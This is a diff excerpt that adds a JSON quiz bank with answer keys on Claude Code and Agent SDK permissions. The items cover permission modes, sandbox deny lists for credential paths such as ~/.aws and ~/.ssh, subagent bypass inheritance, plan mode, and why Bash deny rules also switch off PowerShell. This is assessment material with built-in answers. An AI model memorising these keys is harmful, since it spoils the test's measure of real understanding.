+        "text": "The classifier caches its verdicts per model and needs a new session to rebuild them",
+        "why": "Nothing is cached per model; the session's permission mode changed."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "`setModel()` always resets the permission mode to whatever was passed to `query()`",
+        "why": "The documented fallback is to default when the new model is unsupported, not a reset to the original options."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "Auto mode is only available on third-party providers once a session has started, so the switch disabled it permanently",
+        "why": "The session can return to auto mode; it just has to be asked to."
+      },
+      {
+        "id": "D",
+        "correct": true,
+        "text": "Switching to the unsupported model moved the session to `default`, and switching back does not restore `auto`; call `setPermissionMode('auto')`",
+        "why": "The mode change is reported by a `system` status message, and auto must be re-requested explicitly once a supported model is active."
+      }
+    ],
+    "explanation": "If a session in auto mode switches to a model auto mode does not support (through `set_model()`, `setModel()` or `applyFlagSettings()`), it changes to `default` and emits a `system` message with subtype `status` and `permissionMode: 'default'`. To return, switch to a supported model and then call `setPermissionMode('auto')`; while the unsupported model is active that call fails.",
+    "reference": "Agent SDK docs: Configure permissions (Auto mode)",
+    "source": "interview:auto-mode",
+    "asked": {
+      "frequency": "common",
+      "evidence": [
+        "https://code.claude.com/docs/en/permission-modes",
+        "https://github.com/anthropics/claude-agent-sdk-typescript/blob/main/CHANGELOG.md",
+        "https://github.com/mario-andreschak/FLUJO/issues/1092"
+      ]
+    },
+    "roleLevel": 4
+  },
+  {
+    "id": "CSK-PRM-039",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 4,
+    "type": "single",
+    "select": 1,
+    "stem": "A TypeScript host passes `settings: { sandbox: { filesystem: { denyRead: ['~/.aws'] } } }` inline and also `sandbox: { enabled: true, filesystem: { denyRead: ['~/.ssh'] } }`. Which paths are in the effective `denyRead` for sandboxed commands?",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "Only `~/.ssh`, because a value set by the `sandbox` option replaces the value at the same path",
+        "why": "Scalar values are replaced that way, but restriction lists such as denyRead are combined."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "Only `~/.aws`, because inline settings sit in the flag-settings layer and outrank options",
+        "why": "The sandbox option is merged into the inline settings block; it does not lose to it."
+      },
+      {
+        "id": "C",
+        "correct": true,
+        "text": "Both `~/.aws` and `~/.ssh`, because restriction lists from the option and inline settings are combined",
+        "why": "denyRead, denyWrite, deniedDomains and the credentials lists are merged rather than replaced."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "Neither; `query()` rejects the options because `sandbox` and `settings.sandbox` cannot both be set",
+        "why": "Only a settings file path cannot be combined with the sandbox option; an inline object can."
+      }
+    ],
+    "explanation": "When `settings` is given inline and has its own `sandbox` block, the `sandbox` option is merged into it. A value the option sets replaces the value at the same path, but the restriction lists (`filesystem.denyRead`, `filesystem.denyWrite`, `network.deniedDomains`, `credentials.files`, `credentials.envVars`) are combined. A `settings` file path cannot be combined with the option. With `enabled: true`, `failIfUnavailable` defaults to true, so missing sandbox dependencies fail the query instead of running unsandboxed.",
+    "reference": "Agent SDK docs: TypeScript reference (Options: sandbox)",
+    "source": "interview:sandbox-option",
+    "asked": {
+      "frequency": "common",
+      "evidence": [
+        "https://code.claude.com/docs/en/sandboxing",
+        "https://code.claude.com/docs/en/agent-sdk/python",
+        "https://github.com/anthropics/claude-agent-sdk-typescript/blob/main/CHANGELOG.md"
+      ]
+    },
+    "roleLevel": 5
+  },
+  {
+    "id": "CSK-PRM-040",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 4,
+    "type": "single",
+    "select": 1,
+    "stem": "A parent SDK session runs in `bypassPermissions`. One `AgentDefinition` sets `permissionMode: 'plan'` so that a reviewer subagent cannot edit files. In which mode does that subagent run?",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "`plan`, because the AgentDefinition's mode always overrides the parent's",
+        "why": "The override is honoured only for parents in default, dontAsk or plan mode."
+      },
+      {
+        "id": "B",
+        "correct": true,
+        "text": "`bypassPermissions`, because a subagent's own mode applies only when the parent is in `default`, `dontAsk` or `plan`",
+        "why": "A parent in bypass passes bypass down regardless of the AgentDefinition, which is why bypass is risky with subagents."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "`default`, because subagents never inherit bypassPermissions",
+        "why": "The rule that bypass is never applied concerns a subagent's own `bypassPermissions` value, not inheritance from a bypass parent."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "`acceptEdits`, the nearest safe mode to bypass",
+        "why": "There is no automatic downgrade to acceptEdits."
+      }
+    ],
+    "explanation": "A subagent runs in the parent's mode unless its `AgentDefinition` sets `permissionMode` and the parent is in `default`, `dontAsk` or `plan`. Claude Code never applies a subagent's own `bypassPermissions` value, but a subagent runs in bypass whenever the parent does. To keep a reviewer read-only under a bypass parent, restrict its tools rather than relying on its mode.",
+    "reference": "Agent SDK docs: Configure permissions (Subagent inheritance)",
+    "roleLevel": 4
+  },
+  {
+    "id": "CSK-PRM-041",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 4,
+    "type": "single",
+    "select": 1,
+    "stem": "An SDK session runs in `plan` mode. `allowedTools` includes `Edit`, and a `PreToolUse` hook returns `allow` for every Edit call. Claude tries to edit `src/app.ts`. What happens?",
+    "options": [
+      {
+        "id": "A",
+        "correct": true,
+        "text": "It goes to `canUseTool`, because edits are never auto-approved in plan mode",
+        "why": "Neither an allow rule nor a hook allow can approve a file edit while planning."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "It runs, because the hook's allow is checked first and resolves the call",
+        "why": "In plan mode a hook allow has no effect on file edits and other calls that are not read-only."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "It runs, because the allow rule approves it at the allow-rule step",
+        "why": "Plan mode sends file edits to the callback regardless of allow rules."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "It is denied outright, because plan mode blocks every write",
+        "why": "Plan mode does not deny edits; it routes them to your callback so they can be approved."
+      }
+    ],
+    "explanation": "In `plan` mode, file edits (and, on recent Claude Code versions, shell commands that modify files) are never auto-approved, even when an allow rule matches or a `PreToolUse` hook returns `allow`; they prompt through `canUseTool`. The hook's `updatedInput` is still applied. Approving the plan or switching modes lifts the limit.",
+    "reference": "Agent SDK docs: Configure permissions (Plan mode)",
+    "roleLevel": 4
+  },
+  {
+    "id": "CSK-PRM-042",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 4,
+    "type": "match",
+    "select": 1,
+    "stem": "These `Read` deny rules are written in a project's `.claude/settings.json`. Match each rule with what it blocks.",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "`/secrets/**` at the root of the filesystem",
+        "why": "An absolute path, written with a double leading slash."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "A `secrets` folder in the user's home directory",
+        "why": "A home-relative path, written with `~/`."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "The `secrets` folder at the project root only",
+        "why": "Anchored at the settings source, which is the project root for project settings."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "Any folder named `secrets` at any depth under the current directory",
+        "why": "A single-segment relative pattern in a deny rule matches at any depth."
+      }
+    ],
+    "prompts": [
+      {
+        "id": "P1",
+        "text": "`Read(//secrets/**)`",
+        "answer": "A"
+      },
+      {
+        "id": "P2",
+        "text": "`Read(~/secrets/**)`",
+        "answer": "B"
+      },
+      {
+        "id": "P3",
+        "text": "`Read(/secrets/**)`",
+        "answer": "C"
+      },
+      {
+        "id": "P4",
+        "text": "`Read(secrets/**)`",
+        "answer": "D"
+      }
+    ],
+    "explanation": "`//path` is absolute, `~/path` is relative to home, `/path` is relative to the settings source (the project root for project and local settings, `~/.claude` for user settings), and `path` is relative to the current directory. A single-segment pattern such as `secrets/**` matches at any depth in deny and ask rules, but only at `<cwd>/secrets` in allow rules.",
+    "reference": "Claude Code docs: Configure permissions (How path patterns match)",
+    "roleLevel": 3
+  },
+  {
+    "id": "CSK-PRM-043",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 4,
+    "type": "single",
+    "select": 1,
+    "stem": "Your SaaS runs agents for customers and sends approval requests to a web dashboard. Reviewers sometimes respond hours later, and your workers are recycled every few minutes. How should approvals be handled?",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "Keep `canUseTool` pending and set the SDK's callback timeout option to several hours",
+        "why": "The SDK has no configurable callback timeout; a pending callback simply holds the process."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "Return `deny` with `interrupt: true`, then rerun the whole task from scratch once the reviewer approves",
+        "why": "This throws away the session's progress instead of resuming it."
+      },
+      {
+        "id": "C",
+        "correct": true,
+        "text": "Have a `PreToolUse` hook return `defer` for calls that need review, let the process exit, and resume the persisted session when the decision arrives",
+        "why": "The docs recommend defer when a user may take longer to respond than the process can stay running."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "Run in `bypassPermissions` and have reviewers inspect the changes afterwards",
+        "why": "Approving everything first defeats the point of review and offers no protection against prompt injection."
+      }
+    ],
+    "explanation": "`canUseTool` can stay pending indefinitely, but the process has to stay alive while it waits. When a decision may take longer than a worker lives, register a `PreToolUse` hook that returns the `defer` decision, so the process can exit and the session can be resumed later from storage.",
+    "reference": "Agent SDK docs: Handle approvals and user input",
+    "source": "interview:can-use-tool-callback",
+    "asked": {
+      "frequency": "very-common",
+      "evidence": [
+        "https://hidekazu-konishi.com/entry/claude_agent_sdk_complete_guide.html",
+        "https://code.claude.com/docs/en/agent-sdk/permissions",
+        "https://code.claude.com/docs/en/agent-sdk/user-input",
+        "https://github.com/anthropics/claude-agent-sdk-typescript/issues/470"
+      ]
+    },
+    "roleLevel": 5
+  },
+  {
+    "id": "CSK-PRM-044",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 4,
+    "type": "single",
+    "select": 1,
+    "stem": "A team adds `\"allow\": [\"WebFetch\"]` so Claude can fetch without prompts. With the sandbox enabled, a sandboxed `curl https://registry.example.com/pkg` still prompts for that host. What fixes it while keeping the sandbox?",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "Change the rule to a bare `\"Bash\"` allow so curl is approved",
+        "why": "Approving the Bash command does not add the host to the sandbox's network allowlist."
+      },
+      {
+        "id": "B",
+        "correct": true,
+        "text": "Allow `WebFetch(domain:registry.example.com)` or add the host to `sandbox.network.allowedDomains`",
+        "why": "Only the `domain:` form of a WebFetch rule feeds the sandbox's domain list; the bare form does not."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "Set `autoAllowBashIfSandboxed: false` so curl goes through the WebFetch rule",
+        "why": "That makes more sandboxed commands prompt; it does not open the host."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "Nothing; sandboxed commands can never reach hosts that WebFetch is allowed to fetch",
+        "why": "Sandboxed commands can reach hosts in the merged allowlist, which domain rules contribute to."
+      }
+    ],
+    "explanation": "A bare `WebFetch` allow lets the WebFetch tool fetch without prompting but does not change which hosts sandboxed commands can reach. `WebFetch(domain:...)` rules are merged into the sandbox's allowed or denied domain list, and so are `sandbox.network.allowedDomains` entries. WebFetch, in turn, never reads the sandbox allowlist.",
+    "reference": "Claude Code docs: Configure permissions (WebFetch)",
+    "roleLevel": 3
+  },
+  {
+    "id": "CSK-PRM-045",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 4,
+    "type": "single",
+    "select": 1,
+    "stem": "On Windows with Git Bash installed, a developer adds the deny rule `Bash(git push *)`. Afterwards the PowerShell tool has silently disappeared from sessions. What explains it, and how can PowerShell be kept?",
+    "options": [
+      {
+        "id": "A",
+        "correct": true,
+        "text": "Denying Bash also turns PowerShell off so the rule cannot be bypassed there; set `CLAUDE_CODE_USE_POWERSHELL_TOOL=1` or add a scoped rule such as `PowerShell(git push *)`",
+        "why": "Because a Bash rule does not restrict PowerShell, Claude Code turns PowerShell off unless you opt back in or add a PowerShell rule."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "Any Bash deny rule removes the Bash tool entirely, and PowerShell depends on it",
+        "why": "A scoped deny keeps Bash available; it is PowerShell that is switched off."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "PowerShell rules inherit Bash rules, and `git push` is its only use",
+        "why": "PowerShell has its own rule syntax and is not limited to git."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "The PowerShell tool is opt-in on Windows and was never enabled",
+        "why": "On Windows the tool is on by default for claude.ai and Console accounts; the deny rule turned it off."
+      }
+    ],
+    "explanation": "On Windows with Git Bash, any Bash deny rule (scoped or bare, from settings or `--disallowedTools`) also turns off the PowerShell tool, because Bash rules do not restrict PowerShell commands and Claude could otherwise run the denied command there. Keep PowerShell by setting `CLAUDE_CODE_USE_POWERSHELL_TOOL=1` or by adding a scoped PowerShell rule.",
+    "reference": "Claude Code docs: Tools reference (PowerShell tool)",
+    "roleLevel": 3
+  }
+]
